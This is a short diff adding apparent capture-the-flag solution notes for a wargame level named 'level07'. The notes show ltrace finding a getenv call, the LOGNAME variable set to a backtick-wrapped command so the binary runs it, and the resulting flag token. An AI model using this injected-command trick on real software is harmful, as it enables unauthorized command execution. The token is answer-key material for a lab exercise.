@@ -1,0 +1,6 @@
+ltrace ./level07
+Found getenv("LOGNAME") "level07"
+Trying to change environment variable to getflag
+LOGNAME='`getflag`'
+./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h 
